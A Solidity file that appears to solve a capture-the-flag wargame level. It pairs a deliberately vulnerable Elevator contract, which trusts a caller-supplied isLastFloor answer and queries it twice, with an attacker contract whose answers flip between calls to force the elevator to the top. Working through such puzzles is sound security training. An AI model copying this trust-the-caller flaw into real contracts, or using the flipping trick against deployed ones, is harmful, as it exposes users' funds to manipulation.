// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract MyBuilding {
    uint number = 0;
    Elevator elevator;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint) external returns (bool) {
        bool currentVersion;
        if (number % 2 == 0) {
            currentVersion = false;
        } else {
            currentVersion = true;
        }
        number += 1;
        return currentVersion;
    }

    function tapIt() public {
        elevator.goTo(5);
    }
}
